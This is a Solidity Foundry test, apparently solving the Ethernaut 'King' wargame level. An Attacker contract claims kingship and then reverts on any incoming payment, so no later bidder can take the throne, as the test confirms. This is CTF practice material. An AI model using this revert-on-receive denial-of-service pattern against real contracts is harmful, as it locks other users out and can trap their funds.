// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {King} from "../src/King.sol";

contract KingTest is Test {
    King target;
    address player;

    function setUp() public {
        target = new King{value: 0.01 ether}();
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        assertEq(target._king(), address(this), "expected test to be king");
    }

    function attack() private {
        new Attacker{value: 0.01 ether + 1}(address(target));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target._king(), player, "player must be king");

        address victim = makeAddr("victim");
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        (bool ok,) = address(target).call{value: 50 ether}("");
        assertFalse(ok, "should have failed to become a king");
    }
}

contract Attacker {
    constructor(address to) payable {
        (bool ok,) = payable(to).call{value: msg.value}("");
        require(ok, "failed to become king");
    }

    receive() external payable {
        revert();
    }
}
